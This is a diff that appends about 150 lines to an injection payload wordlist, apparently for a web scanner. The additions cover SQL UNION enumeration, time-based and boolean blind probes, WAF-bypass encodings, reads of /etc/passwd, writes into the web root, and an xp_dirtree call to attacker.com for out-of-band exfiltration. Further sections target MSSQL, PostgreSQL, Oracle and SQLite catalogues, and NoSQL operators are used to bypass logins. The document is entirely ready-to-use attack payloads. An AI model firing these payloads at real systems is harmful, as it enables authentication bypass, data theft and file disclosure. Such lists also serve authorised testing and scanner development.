@@ -459,3 +459,150 @@ ws_2nd_') OR ('1'='1
 \x27 OR \x271\x27=\x271
 ' OR '1'='1
 &#x27; OR &#x27;1&#x27;=&#x27;1
+
+# ── ADDITIONAL UNION COLUMN ENUMERATION ──
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+' UNION SELECT 1,2,3,4,5,6,7-- -
+' UNION SELECT 1,2,3,4,5,6,7,8-- -
+' UNION SELECT 1,2,3,4,5,6,7,8,9-- -
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -
+-1' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+-1' UNION SELECT 1,2,3,4,5--
+-1' UNION SELECT 1,2,3,4,5,6--
+-1' UNION SELECT 1,2,3,4,5,6,7--
+-1' UNION SELECT 1,2,3,4,5,6,7,8--
+0' UNION SELECT NULL,NULL,NULL,NULL--
+0' UNION SELECT 1,2,3,4--
+0' UNION SELECT 1,2,3,4,5--
+
+# ── ADDITIONAL TIME-BASED MYSQL ──
+' AND IF(1=1,SLEEP(1),0)--
+' AND IF(1=1,SLEEP(2),0)--
+' AND IF(1=1,SLEEP(5),0)--
+' AND IF((SELECT 1 FROM users LIMIT 1)=1,SLEEP(3),0)--
+' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)--
+' AND IF(LENGTH(database())=5,SLEEP(3),0)--
+' AND IF(LENGTH(database())>0,SLEEP(3),0)--
+1 AND IF(1=1,SLEEP(3),0)--
+1 OR IF(1=1,SLEEP(3),0)--
+' OR IF((SELECT count(*) FROM users)>0,SLEEP(3),0)--
+
+# ── ADDITIONAL BOOLEAN-BASED ──
+' AND 1=1-- -
+' AND 1=0-- -
+' OR 1=1-- -
+' OR 1=0-- -
+' AND (SELECT 1)-- -
+' AND (SELECT COUNT(*) FROM users)>0-- -
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')-- -
+' AND NOT EXISTS(SELECT 1 FROM users WHERE username='nonexistent')-- -
+' AND 1 BETWEEN 0 AND 2-- -
+' AND 1 IN (1,2,3)-- -
+' AND 1 NOT IN (0,2,3)-- -
+' AND 1 LIKE 1-- -
+' AND 'a' LIKE 'a'-- -
+1 AND 1 BETWEEN 0 AND 2
+1 AND 1 IN(1,2,3)
+
+# ── ADDITIONAL WAF BYPASS ──
+'%20/*!union*/%20/*!select*/%201,2,3--
+'%20/*!50000UNION*/%20/*!50000SELECT*/%201,2,3--
+'+union+select+1,2,3--
+'%2bunion%2bselect%2b1,2,3--
+'   union   select   1,2,3--
+'%0aunion%0aselect%0a1,2,3--
+'%0dunion%0dselect%0d1,2,3--
+'/**/union/**/select/**/1,2,3--
+'%23%0a union %23%0a select %23%0a 1,2,3--
+' UNION/*&a=*/SELECT/*&a=*/1,2,3--
+' UNION%23foo*%0ASELECT 1,2,3--
+
+# ── ADDITIONAL OOB ──
+' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--
+' UNION SELECT 1,LOAD_FILE(0x2f6574632f706173737764),3--
+' INTO OUTFILE '/var/www/html/ws_test.txt'--
+' INTO DUMPFILE '/var/www/html/ws_test.txt'--
+'; EXEC master..xp_dirtree '\\attacker.com\a'--
+
+# ── ADDITIONAL MSSQL ──
+' AND 1=CONVERT(int,USER)--
+' AND 1=CONVERT(int,DB_NAME())--
+' AND 1=CONVERT(int,@@servername)--
+'; EXEC sp_executesql N'SELECT 1'--
+'; EXEC sp_helpdb--
+'; SELECT name FROM master..sysdatabases--
+'; SELECT name FROM master..sysobjects WHERE xtype='U'--
+'; SELECT TOP 1 name FROM sys.tables--
+' UNION SELECT NULL,name,NULL FROM master..sysdatabases--
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
+' UNION SELECT NULL,column_name,NULL FROM information_schema.columns--
+
+# ── ADDITIONAL POSTGRESQL ──
+'; SELECT current_database()--
+'; SELECT current_user--
+'; SELECT session_user--
+'; SELECT pg_postmaster_start_time()--
+'; SELECT * FROM pg_tables--
+'; SELECT * FROM information_schema.tables--
+'; SELECT table_name FROM information_schema.tables WHERE table_schema='public'--
+'; SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1,current_user,3--
+' UNION SELECT 1,version(),3--
+' UNION SELECT 1,current_database(),3--
+' UNION SELECT 1,pg_read_file('/etc/passwd',0,1000),3--
+
+# ── ADDITIONAL ORACLE ──
+' UNION SELECT NULL,user,NULL FROM dual--
+' UNION SELECT NULL,name,NULL FROM v$database--
+' UNION SELECT NULL,table_name,NULL FROM all_tables WHERE rownum=1--
+' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
+'; BEGIN EXECUTE IMMEDIATE 'SELECT 1 FROM dual'; END;--
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+' ORDER BY 5--
+
+# ── ADDITIONAL NoSQL ──
+' || 1==1//
+' || 1==1%00
+{"username":{"$gt":""},"password":{"$gt":""}}
+{"username":{"$regex":".*"},"password":{"$regex":".*"}}
+{"username":"admin","password":{"$gt":""}}
+{"$or":[{"username":"admin"},{"username":"administrator"}]}
+{"$and":[{"username":"admin"},{"password":{"$ne":""}}]}
+username=admin&password[$ne]=x
+username[$exists]=true&password[$exists]=true
+username[$regex]=^admin&password[$ne]=x
+username[$in][]=admin&username[$in][]=root&password[$ne]=x
+
+# ── ADDITIONAL SQLITE ──
+' UNION SELECT NULL,sqlite_version(),NULL--
+' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'--
+' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='index'--
+' AND (SELECT count(*) FROM sqlite_master)>0--
+' AND (SELECT SUBSTR(name,1,1) FROM sqlite_master WHERE type='table' LIMIT 1)='u'--
+
+# ── ADDITIONAL INJECTION MARKERS ──
+1 or 1=1
+1 or 1=1--
+1 or 1=1#
+1 or 1=1/*
+admin'--
+admin'#
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or ('1'='1
+')) or (('1'='1
+admin' or '1'='1
+admin' or '1'='1'--
+admin'or 1=1 or ''='
+1 OR "1"="1
+1 OR "1"="1"--
+' AND "1"="1"--
+' AND "1"="1"#
